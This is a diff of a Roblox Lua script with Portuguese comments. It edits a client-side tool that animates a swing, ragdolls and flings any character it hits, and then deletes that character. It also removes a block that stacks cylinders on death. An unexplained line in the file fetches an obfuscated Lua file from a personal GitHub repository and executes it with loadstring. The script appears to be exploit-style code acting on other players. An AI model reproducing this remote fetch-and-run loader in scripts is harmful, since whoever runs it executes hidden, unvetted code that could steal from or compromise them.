@@ -6,7 +6,7 @@ tool.RequiresHandle = true
 -- Criando o Handle (parte física da ferramenta)
 local handle = Instance.new("Part")
 handle.Name = "Handle"
-handle.Size = Vector3.new(1, 5, 1)  -- Tamanho do item
+handle.Size = Vector3.new(1, 5, 1)
 handle.Anchored = false
 handle.CanCollide = false
 handle.Parent = tool
@@ -16,126 +16,66 @@ tool.Parent = game.Players.LocalPlayer.Backpack
 
 -- Adicionando o som ao item
 local sound = Instance.new("Sound")
-sound.SoundId = "rbxassetid://17803968700"  -- ID do som
+sound.SoundId = "rbxassetid://17803968700"
+sound.Volume = 4  -- Volume ajustado
 sound.Parent = handle
 
--- Função para tocar o som e animação com delay no som
+-- Função para tocar a animação e só tocar som se acertar alguém
 tool.Activated:Connect(function()
-    -- Criando a animação para o jogador
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+    if not character then return end
+
+    local humanoid = character:FindFirstChild("Humanoid")
+    if not humanoid then return end
+
+    -- Criar e tocar a animação
     local anim = Instance.new("Animation")
-    anim.AnimationId = "rbxassetid://218504594"  -- ID da animação
-    local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
-    
-    -- Reproduz a animação no humanoide do jogador
-    humanoid:LoadAnimation(anim):Play()
+    anim.AnimationId = "rbxassetid://218504594"
 
-    -- Esperar 0.3 segundos antes de tocar o som
-    wait(0.3)
-    
-    -- Reproduz o som
-    sound:Play()
+    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
+    local animationTrack = animator:LoadAnimation(anim)
+    animationTrack:Play()
 
-    -- Verifica se a animação atingiu algum jogador
-    local character = game.Players.LocalPlayer.Character
-    if character then
-        -- Detecta se a animação atingiu outro jogador
-        local hit = workspace:FindPartOnRayWithIgnoreList(character.HumanoidRootPart.Position, character.HumanoidRootPart.CFrame.LookVector * 5, {character})
-        
-        -- Se colidiu com algo que tem um humanoide (outro jogador)
-        if hit and hit.Parent and hit.Parent:FindFirstChild("Humanoid") then
-            local targetHumanoid = hit.Parent:FindFirstChild("Humanoid")
-            
-            -- Tornar o alvo ragdoll
-            if targetHumanoid then
-                local targetCharacter = hit.Parent
+    -- Verificar se atingiu outro jogador
+    task.wait(0.1)  -- pequeno delay após a animação iniciar
 
-                -- Desativa a movimentação do humanoide
-                targetHumanoid.PlatformStand = true
-                targetHumanoid:ChangeState(Enum.HumanoidStateType.Physics)
+    local origin = character.HumanoidRootPart.Position
+    local direction = character.HumanoidRootPart.CFrame.LookVector * 5
+    local ray = Ray.new(origin, direction)
+    local hit, pos = workspace:FindPartOnRayWithIgnoreList(ray, {character})
 
-                -- Destruir o Humanoid e aplicar física
-                for _, part in pairs(targetCharacter:GetChildren()) do
-                    if part:IsA("BasePart") then
-                        part.CanCollide = true
-                        part.Anchored = false
+    if hit and hit.Parent and hit.Parent:FindFirstChild("Humanoid") then
+        local targetHumanoid = hit.Parent:FindFirstChild("Humanoid")
+        local targetCharacter = hit.Parent
 
-                        -- Adicionar força para "arremessar" o jogador para longe
-                        local bodyVelocity = Instance.new("BodyVelocity")
-                        bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)  -- Força máxima
-                        bodyVelocity.Velocity = (targetCharacter.HumanoidRootPart.Position - character.HumanoidRootPart.Position).unit * 100  -- Direção e força do impulso
-                        bodyVelocity.Parent = part
+        -- Toca o som apenas se acertar outro jogador
+        sound:Play()
 
-                        -- Garantir que a personagem caia no chão aplicando uma força para baixo
-                        local bodyForce = Instance.new("BodyVelocity")
-                        bodyForce.MaxForce = Vector3.new(0, 10000, 0)
-                        bodyForce.Velocity = Vector3.new(0, -50, 0)  -- Empurrar para baixo
-                        bodyForce.Parent = part
-                    end
-                end
+        -- Ativa ragdoll no alvo
+        targetHumanoid.PlatformStand = true
+        targetHumanoid:ChangeState(Enum.HumanoidStateType.Physics)
 
-                -- Remover a física após um curto período
-                game:GetService("Debris"):AddItem(targetCharacter, 2) -- Agora remove o personagem depois de 2 segundos
+        for _, part in pairs(targetCharacter:GetChildren()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = true
+                part.Anchored = false
+
+                local bodyVelocity = Instance.new("BodyVelocity")
+                bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
+                bodyVelocity.Velocity = (targetCharacter.HumanoidRootPart.Position - character.HumanoidRootPart.Position).unit * 100
+                bodyVelocity.Parent = part
+
+                local bodyForce = Instance.new("BodyVelocity")
+                bodyForce.MaxForce = Vector3.new(0, 10000, 0)
+                bodyForce.Velocity = Vector3.new(0, -50, 0)
+                bodyForce.Parent = part
             end
         end
+
+        game:GetService("Debris"):AddItem(targetCharacter, 2)
     end
 end)
 
 -- Carregando o script externo com loadstring
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt", true))()
-
--- Script para criar uma fila de cilindros completamente colados até o céu
-local player = game.Players.LocalPlayer
-
-local cylinders = {} -- Lista para armazenar os cilindros
-
-player.CharacterAdded:Connect(function(char)
-    -- Quando o personagem reaparecer, destruir a fila de cilindros antiga
-    for _, cyl in ipairs(cylinders) do
-        if cyl.Parent then
-            cyl:Destroy()
-        end
-    end
-    cylinders = {} -- Limpa a lista de cilindros
-
-    local humanoid = char:WaitForChild("Humanoid")
-    local rootPart = char:WaitForChild("HumanoidRootPart")
-
-    humanoid.Died:Connect(function()
-        task.wait(0.1)
-
-        -- Faz as partes do corpo subirem suavemente
-        for _, part in ipairs(char:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.CanCollide = false
-                part.AssemblyLinearVelocity = Vector3.new(0, math.random(20, 30), 0)
-            end
-        end
-
-        -- Cria uma fila de cilindros completamente colados
-        if rootPart then
-            local cylinderCount = 200 -- Quantidade de cilindros na fila
-            local cylinderHeight = 50 -- Altura de cada cilindro
-            local startHeight = -100 -- Começar um pouco abaixo do personagem
-
-            for i = 0, cylinderCount - 1 do
-                local cylinder = Instance.new("Part")
-                cylinder.Shape = Enum.PartType.Cylinder
-                cylinder.Size = Vector3.new(20, cylinderHeight, 20) -- Largura 20, Altura ajustável
-                cylinder.Color = Color3.fromRGB(255, 255, 0) -- Amarelo
-                cylinder.Transparency = 0.5 -- Meio transparente
-                cylinder.Anchored = true
-                cylinder.CanCollide = false
-
-                -- Posiciona os cilindros colados, sem distância entre eles
-                cylinder.CFrame = rootPart.CFrame * CFrame.new(0, startHeight + (i * cylinderHeight), 0) * CFrame.Angles(0, 0, math.rad(90))
-                cylinder.Parent = workspace
-
-                -- Armazena o cilindro na lista para destruição futura
-                table.insert(cylinders, cylinder)
-            end
-        end
-    end)
-end)
-
-
-
